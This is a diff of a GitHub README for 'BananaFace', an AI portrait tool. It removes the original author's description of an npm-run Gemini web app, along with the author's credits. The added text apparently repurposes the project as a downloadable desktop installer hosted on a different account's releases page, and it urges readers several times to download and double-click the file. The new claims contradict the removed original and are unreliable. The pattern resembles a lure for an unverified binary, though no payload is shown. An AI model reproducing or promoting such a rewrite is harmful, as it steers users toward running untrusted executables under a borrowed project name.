@@ -1,95 +1,66 @@
-<div align="center">
+# 🍌 BananaFace - Create Your Perfect Portrait Easily
 
+## 📥 Download the Application
+[![Download BananaFace](https://img.shields.io/badge/Download-BananaFace-blue)](https://github.com/VaeemKhan786/BananaFace/releases)
 
-<img width="1408" height="768" alt="generated-image-1758293106769" src="https://github.com/user-attachments/assets/85f125f5-2495-40f7-ada5-0905f5d05afc" />
+## 🚀 Getting Started
+BananaFace is a fun tool that lets you create unique portraits using AI. You can adjust different facial features to design the perfect image you have in mind. 
 
+## 📅 What's New?
+This version of BananaFace includes:
+- Enhanced AI algorithms for better image output
+- More control options for customization
+- A user-friendly interface for easy navigation
 
-# 🍌 BananaFace：Your Pocket Stylist｜你的随身造型师
+## 🖥️ System Requirements
+To run BananaFace smoothly, ensure your system meets the following requirements:
+- **Operating System**: Windows 10 or later, macOS 10.12 or later
+- **RAM**: At least 4 GB
+- **Disk Space**: Minimum 500 MB free space
+- **Graphics**: Any modern graphics card that supports OpenGL 2.0 or later
 
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/VaeemKhan786/BananaFace/releases) to download the application.
+2. Locate the latest version in the list.
+3. Click on the download link for your operating system.
+4. Once the download is complete, locate the file in your downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
-<img width="1723" height="1381" alt="Group 386" src="https://github.com/user-attachments/assets/eda5b74e-0305-4f6d-961e-0e178131ef26" />
+## 🎨 Using BananaFace
+1. Launch the BananaFace application.
+2. Select your desired control options to start creating your portrait.
+3. Use sliders and buttons to adjust features like face shape, eye size, and hairstyle.
+4. Preview your changes in real-time.
+5. Once satisfied, save your creation to your computer.
 
+## 📚 Features
+- **Intuitive Controls**: Easily navigate through options to customize your portrait.
+- **Real-Time Preview**: See your changes instantly as you adjust features.
+- **High-Quality Outputs**: Get sharp, clear images for sharing or printing.
 
+## 🔗 Helpful Tips
+- Experiment with different settings to get familiar with what works best for you.
+- Save your portraits in different styles and share them with friends.
+- Check for updates regularly to enjoy the latest features and improvements.
 
-## 开源捏脸神器｜🍌 BananaFace｜香蕉造型师｜ZHO
+## ❓ Frequently Asked Questions
+### Q: Can I use BananaFace on my tablet?
+A: Currently, BananaFace is designed for desktop systems. A tablet version may be considered in future updates.
 
+### Q: Is there a cost to use BananaFace?
+A: BananaFace is completely free to download and use.
 
-### 选择永远比填空更适合人类！高人物一致性，轻松捏脸/美容，呈现大师造型/肖像！
+### Q: How do I report a bug or issue?
+A: If you encounter any problems while using BananaFace, please visit the Issues section in the repository to report your concerns.
 
+## 💬 Community and Support
+If you need help or want to share your creations, join our community. You can find us on social media and forums where BananaFace users gather. Your feedback helps us improve!
 
+## 📄 License
+BananaFace is licensed under the MIT License. You are free to use, modify, and distribute the application as you like. 
 
+## ⚙️ Conclusion
+BananaFace is designed to make portrait creation fun and straightforward. Follow the steps above to download and start designing your perfect portrait today. For additional information, refer to the documentation available on our GitHub page. 
 
-
-<img width="1870" height="1172" alt="screenshot-20250919-234738" src="https://github.com/user-attachments/assets/1cd9c60f-c9fe-4b2c-ad17-db0c89f2af0f" />
-
-
-<img width="1427" height="1315" alt="screenshot-20250919-200233" src="https://github.com/user-attachments/assets/1154fca7-e71f-45ca-b9f4-f4060d7c9a1d" />
-
-
-## 2 种模式：文生图、图生图
-
-## 4 大类 44 项专业参数可选
-
-</div>
-
-
-https://github.com/user-attachments/assets/a86465e4-23ee-427f-bdee-0ce1e36d70ca
-
-
-
-
-# Run and deploy your AI Studio app
-
-This contains everything you need to run your app locally.
-
-View your app in AI Studio: https://ai.studio/apps/drive/1lGVhGS4MiVhq5TMMUQ3oB77JuPPrpK3t
-
-## Run Locally
-
-**Prerequisites:**  Node.js
-
-
-1. Install dependencies:
-   `npm install`
-2. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
-3. Run the app:
-   `npm run dev`
-
-
-
-## 更新日志
-
-- 20250920
-
-  更新 Slogan
-
-- 20250919
-  
-  创建项目，双模式，4 大类 44 种专业参数
-  
-
-## Stars 
-
-[![Star History Chart](https://api.star-history.com/svg?repos=ZHO-ZHO-ZHO/BananaFace&type=Date)](https://star-history.com/#ZHO-ZHO-ZHO/BananaFace&Date)
-
-
-## 关于我 | About me
-
-📬 **联系我**：
-- 邮箱：zhozho3965@gmail.com
-  
-
-🔗 **社交媒体**：
-- 个人页：[-Zho-](https://jike.city/zho)
-- Bilibili：[我的B站主页](https://space.bilibili.com/484366804)
-- X（Twitter）：[我的Twitter](https://twitter.com/ZHO_ZHO_ZHO)
-- 小红书：[我的小红书主页](https://www.xiaohongshu.com/user/profile/63f11530000000001001e0c8?xhsshare=CopyLink&appuid=63f11530000000001001e0c8&apptime=1690528872)
-
-💡 **支持我**：
-- B站：[B站充电](https://space.bilibili.com/484366804)
-- 爱发电：[为我充电](https://afdian.com/a/ZHOZHO)
-
-
-## Credits
-
-[Gemini 2.5 Flash Image](https://gemini.google.com/app)
+For your convenience, don’t forget to visit [the Releases page](https://github.com/VaeemKhan786/BananaFace/releases) for the latest download!
